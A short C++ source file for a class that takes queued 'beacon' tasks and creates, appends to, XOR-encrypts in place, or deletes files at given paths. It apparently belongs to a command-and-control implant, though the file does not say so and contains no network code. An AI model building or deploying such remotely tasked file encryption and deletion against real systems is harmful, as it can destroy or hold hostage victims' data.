#include "executer.h"

#include <filesystem>
#include <fstream>
#include <cstddef>
#include "util.h"

executer_t::executer_t() {
    beacon_loop_ = std::queue<beacon_t>();
}

bool executer_t::execute_beacon() {
    if (beacon_loop_.empty()) {
        return false;
    }

    auto bc = beacon_loop_.front();
    beacon_loop_.pop();

    switch (bc.type) {
        case 1: {
            std::filesystem::path path(bc.text_data);
            std::filesystem::create_directories(path.parent_path());
            std::ofstream ofs(path, std::ios::app);
            ofs.close();
        }
        break;
        case 2: {
            auto [path, data] = split_path_data(bc.text_data);
            std::ofstream ofs(path, std::ios::app);
            ofs << data;
            ofs.close();
        }
        break;
        case 3: {
            auto [path, data] = split_path_data(bc.text_data);
            auto buf = read_file(path);
            for (std::size_t i = 0; i < buf.size(); i++) {
                buf[i] ^= data[i % data.length()];
            }
            write_file(path, buf.data(), buf.size());
        }
        break;
        case 4: {
            std::filesystem::path path(bc.text_data);
            std::filesystem::remove(path);
        }
        break;
        default:
            return false;
    }
    return true;
}

void executer_t::add_task(beacon_t&beacon) {
    beacon_loop_.push(beacon);
}
